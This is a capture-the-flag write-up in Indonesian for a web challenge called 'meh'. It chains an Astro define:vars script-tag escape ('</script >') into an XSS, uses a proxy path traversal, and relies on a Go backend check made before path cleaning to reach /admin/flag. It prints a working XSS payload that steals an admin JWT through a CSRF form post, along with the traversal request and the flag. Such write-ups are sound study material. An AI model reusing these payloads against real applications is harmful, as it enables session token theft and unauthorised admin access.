# Writeup Challenge: meh

## Analisis Awal
Challenge ini terdiri dari tiga komponen utama:
1. **Web Frontend (Astro)**: Mengelola registrasi, login, profil, dan pengaturan user. Terdapat juga endpoint API untuk proxy ke backend dan mentrigger bot.
2. **Backend (Go)**: Menyimpan flag dan menyediakan API untuk observasi. Memerlukan token JWT dengan role `admin` untuk mengakses endpoint `/admin/flag`.
3. **Bot (Puppeteer)**: Bertugas mengunjungi URL yang diberikan user. Bot ini login sebagai `admin` di aplikasi web.

## Identifikasi Vulnerability

### 1. XSS di Halaman Profil
Pada file `web/src/pages/profile/[username].astro`, variabel user diserialisasi ke dalam tag `<script>` menggunakan `define:vars` milik Astro:
```javascript
<script define:vars={{ handle: user.username, signature: user.signature }}>
  window.MehProfile = { handle, signature };
</script>
```
Meskipun Astro melakukan escaping terhadap `</script>`, ia tidak menangani variasi seperti `</script >` (dengan spasi). Browser tetap menganggap ini sebagai penutup tag script, sehingga kita bisa melakukan breakout dan menyisipkan script baru.

### 2. SSRF / Path Traversal di API Proxy
Endpoint `/api/proxy` di frontend mengizinkan akses ke backend dengan batasan path harus dimulai dengan `api/observations/`. Namun, karena menggunakan `http.request` tanpa sanitasi path yang ketat, kita bisa menggunakan path traversal (`../`) untuk mencapai endpoint internal lainnya di backend.
```javascript
if (!path.startsWith('api/observations/')) { ... }
// ...
const reqPath = '/' + path + '?token=' + encodeURIComponent(token || '');
```

### 3. Backend Path Normalization Mismatch
Backend di `backend/main.go` melakukan pengecekan prefix `/api/` pada `r.RequestURI` sebelum melakukan pembersihan path menggunakan `path.Clean(r.URL.Path)`.
```go
reqURI := r.RequestURI
// ...
if !strings.HasPrefix(originalPath, "/api/") { ... }
cleanPath := path.Clean(r.URL.Path)
```
Request ke `/api/observations/../../admin/flag` akan lolos pengecekan prefix `/api/` dan setelah dibersihkan akan menjadi `/admin/flag`, yang merupakan endpoint untuk mendapatkan flag.

## Langkah Eksploitasi

1. **Persiapan XSS Payload**:
   Payload dirancang untuk berjalan di browser Bot (yang login sebagai admin). Script ini akan:
   - Mengambil token dari halaman `/flag` (halaman khusus admin yang menggenerate token backend).
   - Mengirimkan token tersebut kembali ke kita dengan cara mengupdate signature profil admin itu sendiri (CSRF ke `/settings`).

   Payload (menggunakan bypass spasi):
   ```html
   </script > <script>
   fetch('/flag').then(r=>r.text()).then(h=>{
     const t=h.match(/data-token=.([^.]+)./)[1];
     var f = document.createElement('form');
     f.method = 'POST';
     f.action = '/settings';
     var i = document.createElement('input');
     i.name = 'signature';
     i.value = 'TOKEN:' + t;
     f.appendChild(i);
     document.body.appendChild(f);
     f.submit();
   });
   </script >
   ```

2. **Eksekusi**:
   - Registrasi user baru.
   - Update signature user tersebut dengan payload XSS di atas.
   - Kirim URL profil user kita ke `/api/visit` agar dikunjungi oleh Bot.
   - Tunggu beberapa saat, lalu cek profil `admin` untuk mendapatkan token yang telah dieksfiltrasi.

3. **Pengambilan Flag**:
   Setelah mendapatkan token JWT admin, gunakan endpoint proxy untuk mengambil flag:
   `GET /api/proxy?path=api/observations/../../admin/flag&token=<TOKEN_ADMIN>`

## Flag
<FLAG>THEM?!CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}</FLAG>
